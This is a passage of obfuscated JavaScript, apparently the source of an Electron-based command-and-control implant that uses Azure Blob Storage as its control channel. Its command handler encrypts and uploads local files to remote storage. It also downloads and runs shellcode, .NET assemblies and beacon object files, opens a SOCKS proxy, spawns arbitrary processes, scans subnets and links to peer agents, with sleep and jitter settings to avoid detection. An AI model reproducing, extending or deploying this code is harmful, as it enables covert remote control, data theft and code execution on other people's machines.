      path: "/" + global.agent.container.name + "/" + _0x5ca5aa + "?" + global.agent.sasToken,
      method: "PUT",
      headers: {
        "x-ms-version": "2020-02-10",
        "x-ms-date": new Date().toUTCString(),
        "x-ms-blob-type": "BlockBlob",
        "Content-Type": "text/plain",
        "Content-Length": Buffer.byteLength(_0x42d142)
      }
    };
    return await func_Web_Request(_0x4925aa, _0x42d142);
  } catch (_0xfbc156) {
    debug("Error in func_Blob_Write() : " + _0xfbc156 + " " + _0xfbc156.stack);
    return _0xfbc156;
  }
}
async function func_Blob_Read(_0x487c6b, _0x369bd8) {
  const _0x4f4688 = {
    hostname: global.agent.storageAccount,
    port: 80,
    path: "/" + _0x487c6b + "/" + _0x369bd8 + "?" + global.agent.sasToken,
    method: "GET",
    headers: {
      "x-ms-version": "2020-02-10",
      "x-ms-date": new Date().toUTCString()
    }
  };
  return await func_Web_Request(_0x4f4688);
}
async function func_Split_Quoted_String(_0x2232dd) {
  if (!_0x2232dd) {
    return [];
  }
  _0x2232dd = String(_0x2232dd);
  const _0x4464f7 = [];
  let _0x3e2ebc = "";
  let _0x3b47c8 = false;
  let _0x5c4f51 = "";
  for (let _0x3ac219 = 0; _0x3ac219 < _0x2232dd.length; _0x3ac219++) {
    const _0x3aa2e8 = _0x2232dd[_0x3ac219];
    if (_0x3b47c8) {
      if (_0x3aa2e8 === "\\" && (_0x2232dd[_0x3ac219 + 1] === _0x5c4f51 || _0x2232dd[_0x3ac219 + 1] === "\\")) {
        _0x3e2ebc += _0x2232dd[_0x3ac219 + 1];
        _0x3ac219++;
      } else {
        _0x3aa2e8 === _0x5c4f51 ? (_0x3b47c8 = false, _0x4464f7.push(_0x3e2ebc), _0x3e2ebc = "") : _0x3e2ebc += _0x3aa2e8;
      }
    } else {
      if (_0x3aa2e8 === "\"" || _0x3aa2e8 === "'") {
        _0x3b47c8 = true;
        _0x5c4f51 = _0x3aa2e8;
      } else {
        if (_0x3aa2e8 === "\\" && _0x2232dd[_0x3ac219 + 1] === " ") {
          _0x3e2ebc += " ";
          _0x3ac219++;
        } else {
          _0x3aa2e8 === " " ? _0x3e2ebc.length > 0 && (_0x4464f7.push(_0x3e2ebc), _0x3e2ebc = "") : _0x3e2ebc += _0x3aa2e8;
        }
      }
    }
  }
  _0x3e2ebc.length > 0 && _0x4464f7.push(_0x3e2ebc);
  return _0x4464f7;
}
async function numcheck(_0x2eb2ec, _0x3537a5, _0x220d9e = 1, _0x5992c3 = 900) {
  (typeof _0x2eb2ec !== "number" || isNaN(_0x2eb2ec)) && (_0x2eb2ec = _0x3537a5);
  if (_0x2eb2ec < _0x220d9e) {
    return _0x220d9e;
  } else {
    return _0x2eb2ec > _0x5992c3 ? _0x5992c3 : _0x2eb2ec;
  }
}
async function getrand(_0x2e7333, _0x5a1469) {
  try {
    _0x2e7333 = Number(_0x2e7333);
    _0x5a1469 = Number(_0x5a1469);
    const _0x17ed59 = _0x2e7333 * (_0x5a1469 / 100);
    let _0x1c9935 = _0x2e7333 - _0x17ed59;
    let _0x402a46 = _0x2e7333 + _0x17ed59;
    _0x1c9935 < 1000 && (_0x1c9935 = 1000);
    _0x402a46 < 1000 && (_0x402a46 = 1000);
    _0x402a46 > 600000 && (_0x402a46 = 600000);
    const _0x1384ad = Math.random() * (_0x402a46 - _0x1c9935) + _0x1c9935;
    return Math.floor(_0x1384ad);
  } catch (_0x197c69) {
    return 0;
  }
}
async function send_output(_0x4c0576, _0x233f08, _0x3706da) {
  try {
    debug("Sending output to " + _0x4c0576 + " " + _0x233f08 + " " + _0x3706da);
    await func_Blob_Write(_0x233f08, _0x3706da);
  } catch (_0xda2070) {
    debug("Error in send-output() : " + _0xda2070 + " " + _0xda2070.stack);
  }
}
async function func_Scan_Ports(_0x5d4b19, _0x3203aa) {
  const _0x4a6607 = [];
  const _0x1c5a24 = (_0x1b31c2, _0x36fc60) => {
    return new Promise(_0x2a6482 => {
      const _0x320c04 = new net.Socket();
      _0x320c04.setTimeout(100);
      _0x320c04.on("connect", () => {
        _0x4a6607.push(_0x36fc60);
        _0x320c04.destroy();
        _0x2a6482();
      });
      _0x320c04.on("timeout", () => {
        _0x320c04.destroy();
        _0x2a6482();
      });
      _0x320c04.on("error", () => {
        _0x320c04.destroy();
        _0x2a6482();
      });
      _0x320c04.connect(_0x36fc60, _0x1b31c2);
    });
  };
  const _0xdf44c2 = _0x3203aa.map(_0x50b3ea => _0x1c5a24(_0x5d4b19, _0x50b3ea));
  await Promise.all(_0xdf44c2);
  return _0x4a6607;
}
async function func_File_Move(_0x5133e9, _0xc88e8a) {
  let _0x21f439 = "";
  try {
    !path.isAbsolute(_0x5133e9) && (_0x5133e9 = path.resolve(global.agent.cwd, _0x5133e9));
    !path.isAbsolute(_0xc88e8a) && (_0xc88e8a = path.resolve(global.agent.cwd, _0xc88e8a));
    await fsp.mkdir(path.dirname(_0xc88e8a), {
      recursive: true
    });
    await fsp.rename(_0x5133e9, _0xc88e8a);
    _0x21f439 = "File moved from " + _0x5133e9 + " to " + _0xc88e8a;
  } catch (_0x8a0cbc) {
    _0x21f439 = "Error moving file: " + _0x8a0cbc.stack;
  }
  return _0x21f439;
}
async function func_File_Copy(_0x4a36d0, _0x1b61e0) {
  let _0x327dbd = "";
  try {
    !path.isAbsolute(_0x4a36d0) && (_0x4a36d0 = path.resolve(global.agent.cwd, _0x4a36d0));
    !path.isAbsolute(_0x1b61e0) && (_0x1b61e0 = path.resolve(global.agent.cwd, _0x1b61e0));
    await fsp.mkdir(path.dirname(_0x1b61e0), {
      recursive: true
    });
    await fsp.copyFile(_0x4a36d0, _0x1b61e0);
    _0x327dbd = "File copied from " + _0x4a36d0 + " to " + _0x1b61e0;
  } catch (_0x3a2ffe) {
    _0x327dbd = "Error copying file: " + _0x3a2ffe.stack;
  }
  return _0x327dbd;
}
async function func_File_Read(_0x4a3e4d) {
  try {
    !path.isAbsolute(_0x4a3e4d) && (_0x4a3e4d = path.resolve(global.agent.cwd, _0x4a3e4d));
    const _0x2b2171 = await fsp.readFile(_0x4a3e4d, {
      encoding: "utf8"
    });
    return _0x2b2171;
  } catch (_0x2aaf16) {
    return "[!] " + _0x2aaf16;
  }
}
function func_Spawn_Child(_0x414555, _0x3a07fb = []) {
  return new Promise((_0x4f7362, _0x5af0b6) => {
    const _0x11bbd0 = spawn(_0x414555, _0x3a07fb);
    let _0x19a356 = "";
    let _0x55f745 = "";
    _0x11bbd0.stdout.on("data", _0x4f4e43 => {
      _0x19a356 += _0x4f4e43.toString();
    });
    _0x11bbd0.stderr.on("data", _0x16963d => {
      _0x55f745 += _0x16963d.toString();
    });
    _0x11bbd0.on("close", _0x474fbc => {
      _0x4f7362({
        stdout: _0x19a356.trim(),
        stderr: _0x55f745.trim(),
        pid: _0x11bbd0.pid,
        exitCode: _0x474fbc,
        command: _0x414555 + " " + _0x3a07fb.join(" ")
      });
    });
    _0x11bbd0.on("error", _0x40a233 => {
      _0x5af0b6(_0x40a233);
    });
  });
}
async function func_Drives_Exist(_0x33976c) {
  const _0x5485f4 = _0x33976c + ":\\";
  try {
    await fsp.access(_0x5485f4);
    return true;
  } catch {
    return false;
  }
}
async function func_Drives_Stat(_0x5c2bf8) {
  const _0x5465d1 = _0x5c2bf8 + ":\\";
  try {
    const _0x434fb7 = await fsp.stat(_0x5465d1);
    return _0x434fb7;
  } catch (_0xc90935) {
    throw new Error("Error retrieving stats for " + _0x5c2bf8 + ":: " + _0xc90935.message);
  }
}
async function func_Drives_List() {
  const _0x1c23e6 = "ABCDEFGHIJKLMNOPQRSTUVWXYZ".split("");
  let _0x4e6ee0 = "";
  for (const _0x1e1a5f of _0x1c23e6) {
    if (await func_Drives_Exist(_0x1e1a5f)) {
      _0x4e6ee0 += "Drive: " + _0x1e1a5f + ":\n";
      try {
        const _0x5784f2 = await func_Drives_Stat(_0x1e1a5f);
        _0x4e6ee0 += "Created: " + _0x5784f2.birthtime + "\n";
        _0x4e6ee0 += "Modified: " + _0x5784f2.mtime + "\n";
      } catch (_0x2f6c73) {
        _0x4e6ee0 += _0x2f6c73.message + "\n";
      }
      _0x4e6ee0 += "---\n";
    }
  }
  return _0x4e6ee0;
}
function linkHandler(_0x472394) {
  let _0x1e684b = _0x472394[1];
  let _0x4b5ec8 = _0x472394[2];
  let _0x4026e2 = "";
  _0x4026e2 = "Linking to " + _0x1e684b + ":" + _0x4b5ec8 + "\r\n";
  debug(_0x4026e2);
  global.TCPLinkAgent = new TCPAgent({
    hostname: _0x1e684b,
    port: _0x4b5ec8,
    password: global.P2P_CHALLENGE,
    onMessage: async _0x3e2113 => {
      debug("Received message: " + _0x3e2113);
    },
    onConnect: () => {
      debug("Connected to server");
    },
    onDisconnect: () => {
      debug("Disconnected from server");
    },
    onError: _0x1361f3 => {
      debug("Connection error: " + _0x1361f3);
    }
  });
  global.TCPLinkAgent.connect();
  return _0x4026e2;
}
function unlinkHandler(_0x16f9d5) {
  let _0xfb4bfb = _0x16f9d5[1];
  let _0x49b795 = "";
  _0xfb4bfb === global.TCPLinkAgent.hostname ? (_0x49b795 = "Unlinking from " + _0xfb4bfb, debug(_0x49b795), global.TCPLinkAgent.disconnect()) : (_0x49b795 = "Not linked to " + _0xfb4bfb, debug(_0x49b795));
  return _0x49b795;
}
async function ls(_0x3eda23) {
  try {
    !path.isAbsolute(_0x3eda23) && (_0x3eda23 = path.resolve(global.agent.cwd, _0x3eda23));
    const _0x13b433 = await fsp.readdir(_0x3eda23, {
      withFileTypes: true
    });
    for (const _0x421477 of _0x13b433) {
      const _0x490a78 = path.join(_0x3eda23, _0x421477.name);
      const _0x462e69 = await fsp.stat(_0x490a78);
      _0x421477.stats = _0x462e69;
      _0x421477.type = _0x421477.isDirectory() ? "Directory" : "File";
    }
    return JSON.stringify(_0x13b433);
  } catch (_0x4fa031) {
    debug("Error reading directory:", _0x4fa031);
    return "Error reading directory.";
  }
}
function dnsHandler(_0x6a0b7) {
  return new Promise(_0xe3b5f8 => {
    let _0x726ce1 = "";
    try {
      const _0x4272da = _0x6a0b7.split(" ");
      if (_0x4272da.length < 2) {
        _0x726ce1 += "Invalid command\r\n";
        return _0xe3b5f8(_0x726ce1);
      }
      if (_0x4272da[1].startsWith("@")) {
        const _0x747df6 = _0x4272da[1].substring(1);
        _0x747df6.toLowerCase() === "default" ? (customDnsServer = null, dns.setServers(dns.getServers()), _0x726ce1 += "Reset to system default DNS servers\r\n") : (customDnsServer = _0x747df6, dns.setServers([_0x747df6]), _0x726ce1 += "Using custom DNS server: " + _0x747df6 + "\r\n");
        return _0xe3b5f8(_0x726ce1);
      }
      const _0x3e29d5 = customDnsServer ? new dns.Resolver() : dns;
      if (customDnsServer) {
        _0x3e29d5.setServers([customDnsServer]);
      }
      switch (_0x4272da[1]) {
        case "lookup":
          if (_0x4272da[2]) {
            if (_0x4272da.includes("-all")) {
              let _0x16fea2 = _0x4272da[2];
              let _0x41e274 = 7;
              const _0x1781c3 = () => {
                _0x41e274--;
                _0x41e274 === 0 && _0xe3b5f8(_0x726ce1);
              };
              _0x3e29d5.lookup(_0x16fea2, (_0x3a8b25, _0x31b602, _0x24fd30) => {
                _0x726ce1 += _0x3a8b25 ? "Error resolving IP: " + _0x3a8b25.message + "\r\n" : "Resolved IP: " + _0x31b602 + ", Family: IPv" + _0x24fd30 + "\r\n";
                _0x1781c3();
              });
              _0x3e29d5.resolve4(_0x16fea2, (_0x34ab8a, _0x3cd5e6) => {
                _0x726ce1 += _0x34ab8a ? "Error resolving A record: " + _0x34ab8a.message + "\r\n" : "A (IPv4) Records: " + _0x3cd5e6.join(", ") + "\r\n";
                _0x1781c3();
              });
              _0x3e29d5.resolveMx(_0x16fea2, (_0x58176d, _0xe3f891) => {
                _0x726ce1 += _0x58176d ? "Error resolving MX records: " + _0x58176d.message + "\r\n" : "MX Records: " + JSON.stringify(_0xe3f891, null, 2) + "\r\n";
                _0x1781c3();
              });
              _0x3e29d5.resolveTxt(_0x16fea2, (_0x53f098, _0x4dded3) => {
                _0x726ce1 += _0x53f098 ? "Error resolving TXT records: " + _0x53f098.message + "\r\n" : "TXT Records: " + JSON.stringify(_0x4dded3, null, 2) + "\r\n";
                _0x1781c3();
              });
              _0x3e29d5.resolveCname(_0x16fea2, (_0x3d912d, _0x13b9af) => {
                _0x726ce1 += _0x3d912d ? "Error resolving CNAME records: " + _0x3d912d.message + "\r\n" : "CNAME Records: " + _0x13b9af.join(", ") + "\r\n";
                _0x1781c3();
              });
              _0x3e29d5.resolveNs(_0x16fea2, (_0x2a2677, _0x2b3fa0) => {
                _0x726ce1 += _0x2a2677 ? "Error resolving NS records: " + _0x2a2677.message + "\r\n" : "NS Records: " + _0x2b3fa0.join(", ") + "\r\n";
                _0x1781c3();
              });
            } else {
              _0x3e29d5.lookup(_0x4272da[2], (_0x37bacd, _0x56c7b8, _0x1cd820) => {
                _0x726ce1 += _0x37bacd ? "Error: " + _0x37bacd.message + "\r\n" : "IP Address: " + _0x56c7b8 + ", Family: IPv" + _0x1cd820 + "\r\n";
                _0xe3b5f8(_0x726ce1);
              });
            }
          } else {
            _0x726ce1 += "Usage: dns lookup <hostname> [-all | -mx | -txt | -cname]\r\n";
            _0xe3b5f8(_0x726ce1);
          }
          break;
        case "resolve":
          _0x4272da[2] ? _0x3e29d5.resolve(_0x4272da[2], (_0x1f64a1, _0x1c84cd) => {
            _0x726ce1 += _0x1f64a1 ? "Error: " + _0x1f64a1.message + "\r\n" : "IP Addresses: " + _0x1c84cd.join(", ") + "\r\n";
            _0xe3b5f8(_0x726ce1);
          }) : (_0x726ce1 += "Usage: dns resolve <hostname>\r\n", _0xe3b5f8(_0x726ce1));
          break;
        case "reverse":
          _0x4272da[2] ? _0x3e29d5.reverse(_0x4272da[2], (_0x14c40b, _0x24a74d) => {
            _0x726ce1 += _0x14c40b ? "Error: " + _0x14c40b.message + "\r\n" : "Hostnames: " + _0x24a74d.join(", ") + "\r\n";
            _0xe3b5f8(_0x726ce1);
          }) : (_0x726ce1 += "Usage: dns reverse <ip-address>\r\n", _0xe3b5f8(_0x726ce1));
          break;
        case "config":
          try {
            _0x726ce1 += "Current DNS Servers: " + dns.getServers().join(", ") + "\r\n";
          } catch (_0x100ae8) {
            _0x726ce1 += "Error retrieving DNS config: " + _0x100ae8.message + "\r\n";
          }
          _0xe3b5f8(_0x726ce1);
          break;
        default:
          _0x726ce1 += "Unknown command\r\n";
          _0xe3b5f8(_0x726ce1);
      }
    } catch (_0x2f5b4e) {
      _0x726ce1 += "Unexpected error: " + _0x2f5b4e.message + "\r\n" + _0x2f5b4e.stack + "\r\n";
      _0xe3b5f8(_0x726ce1);
    }
  });
}
async function func_File_Read_ToBuffer(_0x520ef6) {
  try {
    const _0x562e88 = await fsp.readFile(_0x520ef6);
    return _0x562e88;
  } catch (_0x1e54f6) {
    debug("Error reading file: " + _0x1e54f6);
    return "";
  }
}
async function func_Azure_Upload_File(_0x5f17bc, _0xf720b9) {
  try {
    debug("browser.js | func_Azure_Upload_File() hit");
    let _0xdc349d = await func_File_Read_ToBuffer(_0x5f17bc);
    let _0x46f11b = await func_Encrypt(_0xdc349d, global.agent.container.key.key, global.agent.container.key.iv);
    const _0x5d91ef = await func_Web_Request({
      hostname: global.agent.storageAccount,
      port: 80,
      path: "/" + global.agent.container.name + "/" + _0xf720b9 + "?" + global.agent.sasToken,
      method: "PUT",
      headers: {
        "x-ms-blob-type": "BlockBlob",
        "Content-Type": "application/octet-stream"
      }
    }, _0x46f11b, true);
    _0x5d91ef.status != 201 ? (output = "Couldnt upload file, response: " + _0x5d91ef.status, debug(output)) : (output = "Successfully uploaded file " + _0x5f17bc + " to https://" + global.agent.storageAccount + "/" + global.agent.container.name + "/" + _0xf720b9 + " blob", debug(output));
  } catch (_0x5ce3c5) {
    output = "Error uploading file " + _0x5f17bc + " to azure : " + _0x5ce3c5.stack;
    debug(output);
  }
}
async function func_Azure_File_Download(_0x1c4b62, _0x42b09d) {
  let _0x3c34a4 = "";
  try {
    const _0x548d56 = {
      hostname: global.agent.storageAccount,
      port: 80,
      path: "/" + global.agent.container.name + "/" + _0x1c4b62 + "?" + global.agent.sasToken,
      method: "GET"
    };
    const _0x5c8983 = await func_Web_Request(_0x548d56, null, true);
    debug("response status: " + _0x5c8983.status);
    if (_0x5c8983.status !== 200) {
      _0x3c34a4 = "Couldn't download file, response: " + _0x5c8983.status;
      debug(_0x3c34a4);
      return _0x3c34a4;
    } else {
      const _0x2c0dec = await func_Decrypt(Buffer.from(_0x5c8983.data), global.agent.container.key.key, global.agent.container.key.iv);
      await fsp.writeFile(_0x42b09d, _0x2c0dec);
      _0x3c34a4 = "File " + _0x42b09d + " has been saved";
      debug(_0x3c34a4);
      return _0x3c34a4;
    }
  } catch (_0x23d44c) {
    _0x3c34a4 = "func_Azure_File_Download: Error downloading file: " + _0x23d44c.message + " " + _0x23d44c.stack;
    debug(_0x3c34a4);
    return _0x3c34a4;
  }
}
async function func_spawn_socks_proxy(_0x194a5c) {
  debug("main.js | func_spawn_socks_proxy");
  let _0x7d64b9 = "";
  try {
    let _0x27a46d = await createWindow();
    await new Promise(_0x3ccef9 => {
      _0x27a46d.webContents ? _0x27a46d.webContents.on("did-finish-load", _0x3ccef9) : _0x3ccef9();
    });
    const _0x5a0ec6 = new Promise(_0xdd14a6 => {
      ipcMain.once("socks-complete", (_0x3507d1, _0x5408d4) => {
        _0xdd14a6(_0x5408d4);
      });
    });
    _0x27a46d.webContents.send("socks-proxy", _0x194a5c);
    _0x7d64b9 = await _0x5a0ec6;
    return _0x7d64b9;
  } catch (_0x260b6a) {
    debug("func_spawn_socks_proxy: Error : " + _0x260b6a.message);
    throw _0x260b6a;
  }
}
async function func_Azure_Download_Exec(_0x9b86c4) {
  debug("[MAIN][SCEXEC]");
  let _0x544240 = "";
  try {
    const _0x4b3440 = await func_Web_Request({
      hostname: global.agent.storageAccount,
      port: 80,
      path: "/" + global.agent.container.name + "/" + _0x9b86c4 + "?" + global.agent.sasToken,
      method: "GET"
    }, null, true);
    if (_0x4b3440.status !== 200) {
      _0x544240 = "Couldn't download file, response: " + _0x4b3440.status;
      debug(_0x544240);
      return _0x544240;
    } else {
      debug("response status: " + _0x4b3440.status);
      const _0x148c9f = await func_Decrypt(Buffer.from(_0x4b3440.data), global.agent.container.key.key, global.agent.container.key.iv);
      debug("[MAIN][SCEXEC]DECRYPT");
      let _0x5d90a8 = await createWindow();
      await new Promise(_0x123082 => {
        _0x5d90a8 && _0x5d90a8.webContents ? _0x5d90a8.webContents.on("did-finish-load", _0x123082) : _0x123082();
      });
      debug("[MAIN][SCEXEC]CREATE WINDOW");
      const _0x37236f = new Promise(_0x138908 => {
        ipcMain.once("scexec-complete", (_0xb6e239, _0x2dffb0) => {
          debug("[MAIN][SCEXEC]SCEXEC-COMPLETE");
          _0x138908(_0x2dffb0);
        });
      });
      _0x5d90a8.webContents.send("execute-scexec-node", global.scexecNodePath, _0x148c9f);
      const _0x1b660e = await _0x37236f;
      debug("func_Azure_File_Download_Exec result: " + _0x1b660e);
    }
  } catch (_0x28a525) {
    _0x544240 = "func_Azure_Download_Exec: Error downloading executable: " + _0x28a525.message + " " + _0x28a525.stack;
    debug(_0x544240);
    return _0x544240;
  }
}
async function func_Azure_Assembly_Download_Exec(_0x3b5afe, _0x2dcf2b) {
  debug("assembly.js | func_Azure_Assembly_Download_Exec");
  let _0x2ec0af = "";
  try {
    const _0x378d68 = await func_Web_Request({
      hostname: global.agent.storageAccount,
      port: 80,
      path: "/" + global.agent.container.name + "/" + _0x3b5afe + "?" + global.agent.sasToken,
      method: "GET"
    }, null, true);
    if (_0x378d68.status !== 200) {
      _0x2ec0af = "Couldn't download file, response: " + _0x378d68.status;
      debug(_0x2ec0af);
      return _0x2ec0af;
    } else {
      debug("response status: " + _0x378d68.status);
      const _0x1d8cab = await func_Decrypt(Buffer.from(_0x378d68.data), global.agent.container.key.key, global.agent.container.key.iv);
      let _0x36e80d = await createWindow();
      await new Promise(_0x598bbb => {
        _0x36e80d && _0x36e80d.webContents ? _0x36e80d.webContents.on("did-finish-load", _0x598bbb) : _0x598bbb();
      });
      const _0x5475cf = new Promise(_0x2ba176 => {
        ipcMain.once("assembly-complete", (_0x2e13ef, _0x19189b) => {
          _0x2ba176(_0x19189b);
        });
      });
      const _0x591cc = await func_Split_Quoted_String(_0x2dcf2b);
      _0x36e80d.webContents.send("execute-assembly-node", global.assemblyNodePath, _0x1d8cab, _0x591cc);
      const _0x1c5362 = await _0x5475cf;
      debug("[+] main.js | func_Azure_Assembly_Download_Exec | result:\r\n " + _0x1c5362);
      _0x36e80d.close();
      return _0x1c5362;
    }
  } catch (_0x1218d5) {
    _0x2ec0af = "func_Azure_Assembly_Download_Exec:Error downloading assembly: " + _0x1218d5.message + " " + _0x1218d5.stack;
    debug(_0x2ec0af);
    return _0x2ec0af;
  }
}
async function func_Azure_BOF_Download_Exec(_0x469ae3, _0x43b45f) {
  debug("[MAIN][BOF] taskid: " + _0x469ae3.taskid);
  let _0x40036a = "";
  try {
    const _0x39ef83 = await func_Web_Request({
      hostname: global.agent.storageAccount,
      port: 80,
      path: "/" + global.agent.container.name + "/" + _0x469ae3.uploadChannel + "?" + global.agent.sasToken,
      method: "GET"
    }, null, true);
    if (_0x39ef83.status !== 200) {
      _0x40036a = "Couldn't download file, response: " + _0x39ef83.status;
      debug(_0x40036a);
      return _0x40036a;
    } else {
      debug("response status: " + _0x39ef83.status);
      const _0x5ce6b9 = await func_Decrypt(Buffer.from(_0x39ef83.data), global.agent.container.key.key, global.agent.container.key.iv);
      let _0x560c7b = await createWindow();
      await new Promise(_0x3e46a0 => {
        _0x560c7b && _0x560c7b.webContents ? _0x560c7b.webContents.on("did-finish-load", _0x3e46a0) : _0x3e46a0();
      });
      const _0xc687de = new Promise(_0x102930 => {
        ipcMain.once("bof-complete", (_0xe32ee7, _0x870de) => {
          _0x102930(_0x870de);
        });
      });
      debug("[MAIN][BOF] ARGV: " + _0x43b45f);
      let _0x58b093 = _0x43b45f[2];
      let _0x3f8cf5 = _0x43b45f[3];
      const _0x3ad3fa = _0x43b45f.slice(4);
      _0x58b093 === undefined && (_0x58b093 = "go");
      _0x3f8cf5 === undefined && (_0x3f8cf5 = "");
      _0x560c7b.webContents.send("execute-bof-node", global.path_coffloader, _0x5ce6b9, _0x58b093, _0x3f8cf5, _0x3ad3fa);
      const _0x4ec0f2 = await _0xc687de;
      const _0x206df4 = Buffer.from(_0x4ec0f2.output).toString("ascii");
      debug("[+] main.js | func_Azure_BOF_Download_Exec | result:\r\n " + _0x206df4);
      _0x560c7b.close();
      return _0x206df4;
    }
  } catch (_0x409670) {
    _0x40036a = "[BOF] Error downloading bof: " + _0x409670.message + " " + _0x409670.stack;
    debug(_0x40036a);
    return _0x40036a;
  }
}
async function func_cd(_0x3c0f58) {
  try {
    let _0x1214e2;
    let _0x5ca947 = global.agent.cwd;
    _0x3c0f58 == undefined && (_0x3c0f58 = os.homedir());
    if (path.isAbsolute(_0x3c0f58)) {
      _0x1214e2 = _0x3c0f58;
    } else {
      (_0x3c0f58.startsWith("./") || _0x3c0f58.startsWith(".\\")) && (_0x3c0f58 = _0x3c0f58.substring(2));
      while (_0x3c0f58.startsWith("../") || _0x3c0f58.startsWith("..\\")) {
        _0x5ca947 = path.dirname(_0x5ca947);
        _0x3c0f58 = _0x3c0f58.substring(3);
      }
      _0x1214e2 = path.join(_0x5ca947, _0x3c0f58);
    }
    _0x1214e2 = path.normalize(_0x1214e2);
    try {
      const _0x361fe1 = await fsp.stat(_0x1214e2);
      if (!_0x361fe1.isDirectory()) {
        return "[!] Error: " + _0x1214e2 + " is not a directory";
      }
    } catch (_0x3c6e49) {
      return "[!] Error: Directory " + _0x1214e2 + " does not exist";
    }
    global.agent.cwd = _0x1214e2;
    return "Changed directory to " + global.agent.cwd;
  } catch (_0x3c67d2) {
    debug("[!] Error in func_cd: " + _0x3c67d2.message + _0x3c67d2.stack);
    return "[!] Error changing directory: " + _0x3c67d2.message;
  }
}
async function func_Command_Handler(_0x15333b, _0x14fc4d) {
  try {
    if (_0x15333b.command != "") {
      const _0x20abbc = _0x15333b.command;
      !_0x14fc4d && (_0x14fc4d = await func_Split_Quoted_String(_0x15333b.command));
      if (_0x14fc4d[0] != "") {
        let _0xb7e1e2;
        const _0x3cc901 = _0x14fc4d.length > 0 ? _0x14fc4d[1] : "";
        const _0xc65250 = Array.isArray(_0x14fc4d) ? _0x14fc4d.slice(2) : [];
        if (_0x14fc4d[0] === "sleep") {
          !global.agent.sleepinterval && (global.agent.sleepinterval = 5);
          global.agent.sleepinterval ? (global.agent.sleepinterval = await numcheck(Number(_0x14fc4d[1]), 5, 0, 900), global.agent.sleepjitter = await numcheck(Number(_0x14fc4d[2]), 15, 0, 300), _0xb7e1e2 = "Sleeping for " + global.agent.sleepinterval + "s with " + global.agent.sleepjitter + "% jitter.") : _0xb7e1e2 = "[!] Error : global.agent.sleepinterval doesn't exist.";
        } else {
          if (_0x14fc4d[0] === "download") {
            let _0x49a02d = _0x14fc4d[1];
            let _0x8caedd = _0x14fc4d[2];
            await func_Azure_Upload_File(_0x49a02d, _0x8caedd);
            _0xb7e1e2 = "Download completed";
          } else {
            if (_0x14fc4d[0] === "upload") {
              let _0x5c4ee2 = _0x14fc4d[1];
              let _0x1ee554 = _0x14fc4d[2];
              await func_Azure_File_Download(_0x5c4ee2, _0x1ee554);
              _0xb7e1e2 = "Upload completed";
            } else {
              if (_0x14fc4d[0] === "load") {
                const _0x414176 = _0x14fc4d[1];
                !_0x414176 ? _0xb7e1e2 = "[!] Error: No path provided for load command" : (global.mainWindow.webContents.send("load", _0x414176), _0xb7e1e2 = "Load command sent");
              } else {
                if (_0x14fc4d[0] === "scexec") {
                  let _0x4e12eb = _0x14fc4d[1];
                  _0xb7e1e2 = await func_Azure_Download_Exec(_0x4e12eb);
                } else {
                  if (_0x14fc4d[0] === "assembly") {
                    let _0x45290a = _0x14fc4d[1];
                    let _0x1db712 = _0x20abbc.slice(22);
                    _0xb7e1e2 = await func_Azure_Assembly_Download_Exec(_0x45290a, _0x1db712);
                  } else {
                    if (_0x14fc4d[0] === "bof") {
                      debug("[MAIN][DOTASK] argv : " + JSON.stringify(_0x14fc4d));
                      _0xb7e1e2 = await func_Azure_BOF_Download_Exec(_0x15333b, _0x14fc4d);
                    } else {
                      if (_0x14fc4d[0] === "socks") {
                        let _0xd576f7 = _0x14fc4d[1];
                        _0xb7e1e2 = await func_spawn_socks_proxy(_0xd576f7);
                      } else {
                        if (_0x14fc4d[0] == "spawn") {
                          debug("[MAIN][COMMAND] command: " + _0x3cc901);
                          debug("[MAIN][COMMAND] args   : " + _0xc65250);
                          _0xb7e1e2 = await func_Spawn_Child(_0x3cc901, _0xc65250);
                          _0xb7e1e2 = _0xb7e1e2.stdout;
                          debug("[MAIN][COMMAND] Command Output: " + _0xb7e1e2);
                        } else {
                          if (_0x14fc4d[0] == "scan") {
                            const _0xa61b94 = _0x14fc4d[1];
                            const _0x1f1555 = _0x14fc4d.find(_0x3c4e3d => _0x3c4e3d.startsWith("-p"));
                            const _0xafd479 = _0x1f1555 ? _0x1f1555.substring(2).split(",").map(Number) : [80, 80];
                            const _0x4bd36e = _0xa61b94.includes("/");
                            if (_0x4bd36e) {
                              const [_0x548019, _0x1eccf7] = _0xa61b94.split("/");
                              const _0x12413c = _0x548019.split(".").map(Number);
                              const _0x21f9de = 1 << 32 - Number(_0x1eccf7);
                              const _0x20d131 = [];
                              for (let _0x13ca27 = 0; _0x13ca27 < _0x21f9de; _0x13ca27++) {
                                const _0x44f07a = _0x12413c.slice();
                                _0x44f07a[3] += _0x13ca27;
                                const _0x4c37a1 = _0x44f07a.join(".");
                                const _0x1e337f = await func_Scan_Ports(_0x4c37a1, _0xafd479);
                                _0x20d131.push(_0x4c37a1 + ": " + _0x1e337f.join(", "));
                              }
                              _0xb7e1e2 = _0x20d131.join("\n");
                            } else {
                              const _0x20eb27 = await func_Scan_Ports(_0xa61b94, _0xafd479);
                              _0xb7e1e2 = _0xa61b94 + ": " + _0x20eb27.join(", ");
                            }
                          } else {
                            if (_0x14fc4d[0] == "dns") {
                              _0xb7e1e2 = await dnsHandler(_0x20abbc);
                            } else {
                              if (_0x14fc4d[0] == "link") {
                                _0xb7e1e2 = linkHandler(_0x14fc4d);
                              } else {
                                if (_0x14fc4d[0] == "unlink") {
                                  _0xb7e1e2 = unlinkHandler(_0x14fc4d);
                                } else {
                                  if (_0x14fc4d[0] == "set") {
                                    if (_0x14fc4d[1] == "scexec_path") {
                                      global.scexecNodePath = _0x14fc4d[2];
                                      _0xb7e1e2 = "SCEXEC Node Load Path Set to : " + global.scexecNodePath;
                                      debug(_0xb7e1e2);
                                    } else {
                                      if (_0x14fc4d[1] == "assembly_path") {
                                        global.assemblyNodePath = _0x14fc4d[2];
                                        _0xb7e1e2 = "Assembly Node Load Path Set to : " + global.assemblyNodePath;
                                        debug(_0xb7e1e2);
                                      } else {
                                        _0x14fc4d[1] == "bof_path" ? (global.path_coffloader = _0x14fc4d[2], _0xb7e1e2 = "BOF Node Load Path Set to : " + global.path_coffloader, debug(_0xb7e1e2)) : (_0xb7e1e2 = "SCEXEC Node Load Path Set to : " + global.scexecNodePath + "\r\nAssembly Node Load Path Set to : " + global.assemblyNodePath, debug(_0xb7e1e2));
                                      }
                                    }
                                  } else {
                                    if (_0x14fc4d[0] == "drives") {
                                      _0xb7e1e2 = await func_Drives_List();
                                    } else {
                                      if (_0x14fc4d[0] == "ls") {
                                        let _0x12171b;
                                        typeof _0x14fc4d[1] === "undefined" ? _0x12171b = "." : _0x12171b = _0x14fc4d[1];
